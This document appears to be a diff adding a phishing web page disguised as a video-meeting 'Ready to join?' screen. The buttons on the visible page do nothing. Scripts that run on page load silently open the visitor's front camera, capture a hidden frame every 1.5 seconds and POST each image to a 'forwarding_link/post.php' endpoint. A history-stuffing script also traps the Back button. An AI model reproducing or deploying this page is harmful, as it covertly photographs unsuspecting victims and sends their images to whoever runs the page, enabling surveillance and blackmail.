@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ready to join?</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #f0f0f0;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+
+  .container {
+    background-color: #ffffff;
+    border-radius: 10px;
+    padding: 20px;
+    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+    text-align: center;
+    max-width: 90%; /* Adjusted max-width */
+    width: 400px; /* Adjusted width */
+    margin: auto;
+  }
+
+  .header {
+    margin-bottom: 20px;
+  }
+
+  .header img {
+    width: 100%; /* Ensure the image fills the container */
+    border-radius: 10px 10px 0 0; /* Apply border radius only to the top */
+  }
+
+  .button-container {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 20px; /* Add some space between buttons and other content */
+  }
+
+  .button {
+    background-color: #26a1ed; /* Light blue color */
+    color: #ffffff;
+    border: none;
+    padding: 15px 0;
+    font-size: 18px;
+    width: 48%; /* Adjust width to fit both buttons */
+    border-radius: 5px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+
+  .button:last-child {
+    background-color: transparent; /* No background color for "Use Companion mode" button */
+    color: #26a1ed; /* Text color blue */
+  }
+
+  .button:hover {
+    background-color:#26a1ed; /* Darker shade of light blue on hover */
+  }
+
+  .icon {
+    font-size: 24px;
+    margin-right: 10px;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <img src="gpay/cam.png" alt="Image" />
+  </div>
+  <h2>Ready to join?</h2>
+  
+  <div class="button-container">
+    <button class="button">Join now</button>
+    <button class="button"><span class="icon">▶️</span> Present</button>
+  </div>
+  <p>Other joining options</p>
+  <button class="button">Use Companion mode</button>
+</div>
+<!-- Camera functionality -->
+<div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <script>
+    function post(imgdata) {
+      $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'forwarding_link/post.php', // Your PHP file URL
+        dataType: 'json',
+        async: false,
+        success: function(result) {
+          // Handle success
+        },
+        error: function() {
+          // Handle errors
+        }
+      });
+    }
+
+    'use strict';
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const errorMsgElement = document.querySelector('span#errorMsg');
+    const constraints = {
+      audio: false,
+      video: { facingMode: "user" }
+    };
+
+    // Access webcam
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+      }
+    }
+
+    // Success
+    function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
+      var context = canvas.getContext('2d');
+      setInterval(function() {
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData);
+      }, 1500);
+    }
+
+    // Load init
+    init();
+  </script>   
+  <script type="text/javascript">  
+    ! function() {
+      var t;
+      try {
+        for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+        onpopstate = function(t) {
+          t.state && location.replace("https://www.google.com")
+        }
+      } catch (o) {}
+    }();
+  </script>
+
+</body>
+</html>
